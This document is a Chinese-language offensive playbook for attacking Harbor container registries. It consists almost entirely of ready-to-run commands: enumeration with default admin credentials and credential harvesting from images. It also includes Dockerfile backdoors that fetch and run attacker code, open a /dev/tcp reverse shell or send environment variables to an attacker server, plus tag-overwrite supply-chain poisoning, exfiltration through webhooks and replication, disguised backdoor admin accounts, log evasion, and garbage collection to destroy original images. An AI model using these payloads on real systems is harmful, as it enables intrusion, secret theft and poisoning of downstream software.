# Harbor 攻击技术参考

本文档包含 Harbor 容器镜像仓库渗透测试的完整 API 调用、镜像分析命令、后门注入模板和利用 Payload。

---

## 1. API 认证与基础枚举

### 1.1 认证方式

```bash
# Basic Auth（用户名:密码）
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/users/current

# Basic Auth（Base64 编码）
HARBOR_AUTH=$(echo -n 'admin:Harbor12345' | base64)
curl -sk -H "Authorization: Basic $HARBOR_AUTH" https://TARGET/api/v2.0/users/current

# Docker Registry Token（用于 /v2/ API）
TOKEN=$(curl -sk "https://TARGET/service/token?service=harbor-registry&scope=registry:catalog:*" \
  -u admin:Harbor12345 | jq -r '.token')
curl -sk -H "Authorization: Bearer $TOKEN" https://TARGET/v2/_catalog
```

### 1.2 系统信息收集

```bash
# 系统信息（通常无需认证）
curl -sk https://TARGET/api/v2.0/systeminfo | jq .
# 返回: harbor_version, auth_mode, with_notary, with_trivy, registry_url 等

# 系统卷信息（需管理员）
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/systeminfo/volumes | jq .

# 系统配置（需管理员，可能暴露 LDAP/OIDC 配置）
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/configurations | jq .
# 注意: 可能返回 ldap_url, ldap_search_dn, oidc_endpoint 等敏感配置

# 健康检查
curl -sk https://TARGET/api/v2.0/health | jq .

# 统计信息
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/statistics | jq .
```

### 1.3 用户枚举

```bash
# 用户列表（需管理员）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/users?page_size=100" | \
  jq '.[] | {user_id, username, email, realname, admin_flag}'

# 当前用户信息
curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/users/current | jq .

# 搜索用户
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/users/search?username=admin" | jq .
```

---

## 2. 项目与镜像批量枚举

### 2.1 项目枚举

```bash
# 所有项目（分页获取）
PAGE=1
while true; do
  RESULT=$(curl -sk -u admin:Harbor12345 \
    "https://TARGET/api/v2.0/projects?page=$PAGE&page_size=100")
  echo "$RESULT" | jq -r '.[].name' 2>/dev/null
  COUNT=$(echo "$RESULT" | jq 'length' 2>/dev/null)
  [ "$COUNT" -lt 100 ] 2>/dev/null && break
  PAGE=$((PAGE+1))
done

# 项目详细信息
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100&with_detail=true" | \
  jq '.[] | {name, project_id, repo_count, owner_name, metadata: .metadata}'

# 项目成员（可识别高权限用户）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/members" | \
  jq '.[] | {entity_name, role_name, role_id}'
# role_id: 1=项目管理员, 2=开发者, 3=访客, 4=维护者
```

### 2.2 镜像批量枚举

```bash
# 遍历所有项目的所有仓库
for project in $(curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | jq -r '.[].name'); do
  echo "=== 项目: $project ==="
  curl -sk -u admin:Harbor12345 \
    "https://TARGET/api/v2.0/projects/$project/repositories?page_size=100" | \
    jq -r '.[].name'
done

# 获取指定仓库的所有 Artifact 及标签
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts?page_size=100&with_tag=true" | \
  jq '.[] | {digest: .digest, tags: [.tags[]?.name], push_time: .push_time, size: .size}'

# 使用 Registry API 枚举
TOKEN=$(curl -sk "https://TARGET/service/token?service=harbor-registry&scope=registry:catalog:*" \
  -u admin:Harbor12345 | jq -r '.token')
curl -sk -H "Authorization: Bearer $TOKEN" "https://TARGET/v2/_catalog" | jq .

# 列出指定仓库的标签
TOKEN=$(curl -sk "https://TARGET/service/token?service=harbor-registry&scope=repository:PROJECT/IMAGE:pull" \
  -u admin:Harbor12345 | jq -r '.token')
curl -sk -H "Authorization: Bearer $TOKEN" "https://TARGET/v2/PROJECT/IMAGE/tags/list" | jq .
```

### 2.3 使用 skopeo 枚举

```bash
# 列出标签
skopeo list-tags --tls-verify=false \
  --creds admin:Harbor12345 \
  docker://TARGET/PROJECT/IMAGE

# 查看镜像 manifest
skopeo inspect --tls-verify=false \
  --creds admin:Harbor12345 \
  docker://TARGET/PROJECT/IMAGE:TAG

# 查看原始 manifest（含层信息）
skopeo inspect --raw --tls-verify=false \
  --creds admin:Harbor12345 \
  docker://TARGET/PROJECT/IMAGE:TAG | jq .
```

---

## 3. 镜像凭据提取

### 3.1 镜像历史分析

```bash
# 查看构建历史（暴露 ENV/ARG/COPY 指令）
docker history --no-trunc TARGET/PROJECT/IMAGE:TAG

# 使用 skopeo + jq 远程查看 config（无需拉取完整镜像）
skopeo inspect --tls-verify=false \
  --creds admin:Harbor12345 \
  docker://TARGET/PROJECT/IMAGE:TAG | \
  jq '{Env: .Env, Cmd: .Cmd, Labels: .Labels}'
```

### 3.2 自动化凭据搜索

```bash
# 导出镜像并搜索凭据
IMAGE="TARGET/PROJECT/IMAGE:TAG"
WORKDIR="/tmp/harbor-analysis"
mkdir -p "$WORKDIR"

# 方式一: docker save + 逐层搜索
docker save "$IMAGE" -o "$WORKDIR/image.tar"
cd "$WORKDIR" && tar xf image.tar
for layer in $(find . -name "layer.tar"); do
  echo "=== Layer: $layer ==="
  tar tf "$layer" 2>/dev/null | grep -iE '\.(env|key|pem|p12|conf|cfg|ini|yaml|yml|json|properties|xml)$'
done

# 方式二: 在容器中搜索
docker create --name harbor-analyze "$IMAGE"
docker export harbor-analyze | tar x -C "$WORKDIR/rootfs"
docker rm harbor-analyze

# 搜索敏感文件
find "$WORKDIR/rootfs" -type f \( \
  -name "*.env" -o -name ".env" -o -name "*.key" -o -name "*.pem" \
  -o -name "*.p12" -o -name "*.pfx" -o -name "credentials*" \
  -o -name "config.json" -o -name "application.properties" \
  -o -name "application.yml" -o -name "secrets*" \
  -o -name ".git-credentials" -o -name ".npmrc" \
  -o -name ".pypirc" -o -name "id_rsa" \
\) 2>/dev/null

# 搜索硬编码密码/Token
grep -rlE '(password|passwd|secret|token|api_key|apikey|access_key|private_key)' \
  "$WORKDIR/rootfs/app" "$WORKDIR/rootfs/etc" "$WORKDIR/rootfs/root" \
  "$WORKDIR/rootfs/home" 2>/dev/null | head -50

# 搜索 AWS 凭据格式
grep -rlE 'AKIA[0-9A-Z]{16}' "$WORKDIR/rootfs" 2>/dev/null
grep -rlE '[a-zA-Z0-9/+=]{40}' "$WORKDIR/rootfs" 2>/dev/null | head -20
```

### 3.3 环境变量提取

```bash
# 从镜像配置提取环境变量
docker inspect "$IMAGE" | jq -r '.[0].Config.Env[]'

# 远程提取（无需拉取）
skopeo inspect --tls-verify=false \
  --creds admin:Harbor12345 \
  docker://TARGET/PROJECT/IMAGE:TAG | jq -r '.Env[]'

# 过滤高价值变量
docker inspect "$IMAGE" | jq -r '.[0].Config.Env[]' | \
  grep -iE '(password|secret|token|key|credential|database_url|redis_url|mongo|mysql|postgres)'
```

---

## 4. 镜像后门注入模板

### 4.1 最小化后门（单行注入）

```dockerfile
FROM TARGET/PROJECT/IMAGE:latest
RUN echo '* * * * * curl -s https://ATTACKER/c | sh' >> /var/spool/cron/crontabs/root 2>/dev/null; \
    echo '#!/bin/sh' > /usr/local/bin/.health && \
    echo 'nohup sh -c "while true; do sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 2>/dev/null; sleep 300; done" &' >> /usr/local/bin/.health && \
    chmod +x /usr/local/bin/.health
```

### 4.2 环境变量窃取后门

```dockerfile
FROM TARGET/PROJECT/IMAGE:latest
COPY <<'INITEOF' /docker-entrypoint.d/00-telemetry.sh
#!/bin/sh
# 容器启动时自动外传环境变量
DATA=$(env | base64 | tr -d '\n')
HOST=$(hostname)
curl -sf -X POST "https://ATTACKER_SERVER/collect" \
  -H "Content-Type: application/json" \
  -d "{\"host\":\"$HOST\",\"data\":\"$DATA\"}" 2>/dev/null &
INITEOF
RUN chmod +x /docker-entrypoint.d/00-telemetry.sh
```

### 4.3 覆盖原始标签推送

```bash
# 完整供应链攻击流程
ORIGINAL="TARGET/PROJECT/nginx:1.25"
BACKDOORED="TARGET/PROJECT/nginx:1.25"

# 拉取原始镜像
docker pull "$ORIGINAL"
ORIGINAL_DIGEST=$(docker inspect "$ORIGINAL" --format='{{.Id}}')

# 构建后门镜像
docker build -f Dockerfile.inject -t "$BACKDOORED" .

# 推送覆盖（同一标签）
docker push "$BACKDOORED"

# 验证
NEW_DIGEST=$(skopeo inspect --tls-verify=false \
  --creds admin:Harbor12345 \
  docker://"$BACKDOORED" | jq -r '.Digest')
echo "原始: $ORIGINAL_DIGEST -> 篡改后: $NEW_DIGEST"
```

---

## 5. Webhook 配置参考

### 5.1 Webhook API 操作

```bash
# 列出 Webhook 策略
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" | jq .

# 创建 Webhook（完整事件类型）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" \
  -d '{
    "name": "security-audit-hook",
    "description": "Artifact security audit notifications",
    "targets": [{
      "type": "http",
      "address": "https://ATTACKER_SERVER/harbor-events",
      "auth_header": "X-Internal-Token: RANDOM_STRING",
      "skip_cert_verify": true
    }],
    "event_types": [
      "PUSH_ARTIFACT",
      "PULL_ARTIFACT",
      "DELETE_ARTIFACT",
      "SCANNING_COMPLETED",
      "SCANNING_FAILED",
      "TAG_RETENTION",
      "REPLICATION",
      "QUOTA_EXCEED",
      "QUOTA_WARNING"
    ],
    "enabled": true
  }'

# 测试 Webhook
curl -sk -X POST -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies/POLICY_ID/tests" \
  -H "Content-Type: application/json" \
  -d '{"event_type": "PUSH_ARTIFACT"}'

# 删除 Webhook（清理痕迹）
curl -sk -X DELETE -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies/POLICY_ID"

# Webhook 执行记录
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/jobs?policy_id=POLICY_ID" | jq .
```

### 5.2 Webhook Payload 格式

```json
{
  "type": "PUSH_ARTIFACT",
  "occur_at": 1700000000,
  "operator": "admin",
  "event_data": {
    "resources": [{
      "digest": "sha256:abc123...",
      "tag": "latest",
      "resource_url": "TARGET/project/image:latest"
    }],
    "repository": {
      "name": "image",
      "namespace": "project",
      "repo_full_name": "project/image",
      "repo_type": "private"
    }
  }
}
```

---

## 6. 复制策略利用

### 6.1 远程 Registry 端点管理

```bash
# 列出已注册的远程端点
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/registries" | \
  jq '.[] | {id, name, type, url, status}'

# 注册攻击者 Registry 端点
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/registries" \
  -d '{
    "name": "dr-backup-registry",
    "type": "docker-registry",
    "url": "https://ATTACKER_REGISTRY:5000",
    "credential": {
      "type": "basic",
      "access_key": "attacker_user",
      "access_secret": "attacker_pass"
    },
    "insecure": true,
    "description": "Disaster recovery backup endpoint"
  }'

# 测试端点连通性
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/registries/ping" \
  -d '{"url": "https://ATTACKER_REGISTRY:5000", "insecure": true}'
```

### 6.2 复制策略创建与触发

```bash
# 创建 push 模式复制策略（目标 -> 攻击者 Registry）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/replication/policies" \
  -d '{
    "name": "offsite-backup-replication",
    "description": "Automated offsite backup",
    "src_registry": null,
    "dest_registry": {"id": REGISTRY_ID},
    "dest_namespace_replace_count": 0,
    "trigger": {"type": "manual"},
    "filters": [
      {"type": "name", "value": "**"},
      {"type": "tag", "value": "**"}
    ],
    "enabled": true,
    "override": true,
    "speed": -1
  }'

# 手动触发执行
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/replication/executions" \
  -d '{"policy_id": POLICY_ID}'

# 查看执行状态
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/replication/executions?policy_id=POLICY_ID" | \
  jq '.[] | {id, status, total, succeed, failed, trigger}'

# 定时自动复制策略
# trigger type 可选: manual, scheduled, event_based
# scheduled 示例: {"type": "scheduled", "trigger_settings": {"cron": "0 0 2 * * *"}}
# event_based: 每次 push 自动复制
```

---

## 7. Robot Account 操作

### 7.1 系统级 Robot Account

```bash
# 创建系统级 Robot Account（全项目访问）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/robots" \
  -d '{
    "name": "ci-image-scanner",
    "description": "CI pipeline image scanner",
    "duration": -1,
    "level": "system",
    "disable": false,
    "permissions": [{
      "kind": "project",
      "namespace": "*",
      "access": [
        {"resource": "repository", "action": "pull"},
        {"resource": "repository", "action": "push"},
        {"resource": "artifact", "action": "read"},
        {"resource": "scan", "action": "create"}
      ]
    }]
  }'
# 响应包含 name 和 secret，secret 仅显示一次
# 使用: docker login TARGET -u 'robot$ci-image-scanner' -p SECRET

# 列出所有 Robot Account
curl -sk -u admin:Harbor12345 "https://TARGET/api/v2.0/robots" | \
  jq '.[] | {id, name, level, creation_time, expires_at, disable}'
```

### 7.2 项目级 Robot Account

```bash
# 创建项目级 Robot Account（仅限指定项目，更隐蔽）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/robots" \
  -d '{
    "name": "deploy-bot",
    "duration": -1,
    "level": "project",
    "permissions": [{
      "kind": "project",
      "namespace": "PROJECT_NAME",
      "access": [
        {"resource": "repository", "action": "pull"},
        {"resource": "repository", "action": "push"}
      ]
    }]
  }'
```

### 7.3 使用 Robot Account 认证

```bash
# Docker CLI 登录
docker login TARGET -u 'robot$PROJECT+deploy-bot' -p ROBOT_SECRET

# API 调用
ROBOT_AUTH=$(echo -n 'robot$ci-image-scanner:ROBOT_SECRET' | base64)
curl -sk -H "Authorization: Basic $ROBOT_AUTH" \
  "https://TARGET/api/v2.0/projects" | jq '.[].name'

# skopeo 使用 Robot Account
skopeo list-tags --tls-verify=false \
  --creds 'robot$ci-image-scanner:ROBOT_SECRET' \
  docker://TARGET/PROJECT/IMAGE
```

---

## 8. 漏洞扫描利用

### 8.1 扫描操作

```bash
# 触发单个 Artifact 扫描
curl -sk -X POST -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts/TAG/scan"

# 全项目扫描
curl -sk -X POST -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_ID/scan/all"

# 获取扫描结果
curl -sk -u admin:Harbor12345 \
  -H "X-Accept-Vulnerabilities: application/vnd.security.vulnerability.report; version=1.1" \
  "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts/TAG/additions/vulnerabilities" | \
  jq '.. | .vulnerabilities? // empty | .[] | {id, severity, package, version, fix_version, description}'
```

### 8.2 批量导出漏洞情报

```bash
# 遍历所有镜像导出 Critical/High 漏洞
for project in $(curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | jq -r '.[].name'); do
  for repo in $(curl -sk -u admin:Harbor12345 \
    "https://TARGET/api/v2.0/projects/$project/repositories?page_size=100" | \
    jq -r '.[].name' | sed "s|^$project/||"); do
    for tag in $(curl -sk -u admin:Harbor12345 \
      "https://TARGET/api/v2.0/projects/$project/repositories/$repo/artifacts?with_tag=true" | \
      jq -r '.[].tags[]?.name // empty' | head -3); do
      echo "=== $project/$repo:$tag ==="
      curl -sk -u admin:Harbor12345 \
        -H "X-Accept-Vulnerabilities: application/vnd.security.vulnerability.report; version=1.1" \
        "https://TARGET/api/v2.0/projects/$project/repositories/$repo/artifacts/$tag/additions/vulnerabilities" | \
        jq '.. | .vulnerabilities? // empty | .[] | select(.severity == "Critical" or .severity == "High") | {id, severity, package, version}' 2>/dev/null
    done
  done
done
```

---

## 9. 用户管理与提权

### 9.1 创建后门管理员

```bash
# 创建管理员用户
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/users" \
  -d '{
    "username": "svc-scanner",
    "password": "S3cureP@ss!2024",
    "realname": "Security Scanner Service",
    "email": "scanner@internal.corp",
    "comment": "Automated security scanning service account"
  }'

# 将用户提升为管理员
USER_ID=$(curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/users/search?username=svc-scanner" | jq -r '.[0].user_id')
curl -sk -X PUT -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/users/$USER_ID/sysadmin" \
  -d '{"sysadmin_flag": true}'
```

### 9.2 修改已有用户密码

```bash
# 管理员重置其他用户密码
curl -sk -X PUT -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/users/$USER_ID/password" \
  -d '{"new_password": "NewP@ssw0rd!"}'
```

---

## 10. 审计日志与痕迹清理

### 10.1 审计日志查询

```bash
# 查看审计日志（了解监控范围）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/audit-logs?page_size=50&sort=-creation_time" | \
  jq '.[] | {username, operation, resource, resource_type, op_time}'

# 按操作类型筛选
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/audit-logs?page_size=50&operation=pull" | jq .

# 按用户筛选
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/audit-logs?page_size=50&username=admin" | jq .
```

### 10.2 减少日志痕迹

- 使用 Robot Account 代替 admin 操作（日志中显示 `robot$name` 更不显眼）
- 使用 skopeo/crane 代替 docker CLI（减少 pull 日志量）
- 避免在高峰期大量拉取（减少告警触发）
- 创建的 Webhook/复制策略/Robot Account 使用合法命名伪装

---

## 11. Proxy Cache 项目利用

### 11.1 Proxy Cache 检查

```bash
# v2.8+ 支持 Proxy Cache 项目类型
# 列出项目并检查 registry_id（非 0 表示 Proxy Cache 项目）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects?page_size=100" | \
  jq '.[] | select(.registry_id != null and .registry_id > 0) | {name, registry_id}'

# 查看对应的上游 Registry 端点（可能包含认证凭据）
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/registries/REGISTRY_ID" | jq .
# credential 字段可能暴露上游 Registry 的用户名/密码
```

---

## 12. Label 与不可变标签利用

### 12.1 Label 操作

```bash
# 列出全局 Label
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/labels?scope=g" | jq .

# 为 Artifact 添加 Label（伪装为已审核）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts/TAG/labels" \
  -d '{"id": LABEL_ID}'
```

### 12.2 不可变标签规则绕过

```bash
# 查看不可变标签规则
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/immutabletagrules" | jq .

# 如果有管理员权限，可以临时禁用规则
curl -sk -X PUT -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/projects/PROJECT_NAME/immutabletagrules/RULE_ID" \
  -d '{"disabled": true}'

# 推送后再恢复规则
```

---

## 13. 垃圾回收与数据销毁

```bash
# 查看 GC 历史
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/system/gc" | jq .

# 手动触发 GC（删除未引用的层——覆盖镜像后触发 GC 可永久销毁原始镜像）
curl -sk -X POST -u admin:Harbor12345 \
  -H "Content-Type: application/json" \
  "https://TARGET/api/v2.0/system/gc/schedule" \
  -d '{"schedule": {"type": "Manual"}}'

# 查看 GC 执行状态
curl -sk -u admin:Harbor12345 \
  "https://TARGET/api/v2.0/system/gc" | jq '.[0] | {id, status, creation_time, update_time}'
```
